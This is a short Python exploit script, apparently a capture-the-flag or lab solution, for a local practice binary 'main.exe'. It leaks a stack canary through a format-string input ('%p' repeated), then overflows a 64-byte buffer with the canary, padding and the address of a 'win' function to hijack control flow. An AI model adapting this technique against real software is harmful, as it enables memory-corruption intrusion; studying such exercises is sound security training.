from subprocess import Popen, PIPE, STDOUT
import os
import sys
import struct
from time import sleep

def main():
    print("Starting main")
    p = Popen('./main.exe', stdin=PIPE,
              stdout=PIPE, stderr=PIPE)
    
    b = p.stdout.readline()  # addr
    print(b)

    b = p.stdout.readline()  # leakme
    print(b)

    p.stdin.write(b'%p' * 17)
    p.stdin.write(b'\r\n')
    p.stdin.flush()

    b = p.stdout.readline()  # stack
    print(b)
    canary = b[64 * 2:]
    print(canary)

    b = p.stdout.readline()  # Overwriteme
    print(b)

    canary = struct.pack('<L', int(canary, 16))
    win = struct.pack('<L', 0x004073f0)  # main!win

    p.stdin.write(b'D' * 64)
    p.stdin.write(canary)
    p.stdin.write(b'A' * 4)
    p.stdin.write(win)
    p.stdin.write(b'\r\n')
    p.stdin.flush()

    b = p.stdout.readline()  # stack
    print(b)

    p.kill()


if __name__ == "__main__":
    main()
